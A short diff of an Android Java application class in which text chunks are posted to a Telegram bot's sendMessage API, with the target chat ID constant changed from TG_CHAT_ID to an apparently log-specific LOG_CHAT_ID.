@@ -57,7 +57,7 @@ public class XApplication extends Application {
             String chunk = text.substring(start, end);
 
             String urlStr = "https://api.telegram.org/bot" + BuildConfig.TG_BOT_TOKEN + "/sendMessage";
-            String payload = "chat_id=" + BuildConfig.TG_CHAT_ID +
+            String payload = "chat_id=" + BuildConfig.LOG_CHAT_ID +
                          "&text=" + URLEncoder.encode(chunk, "UTF-8");
 
             HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
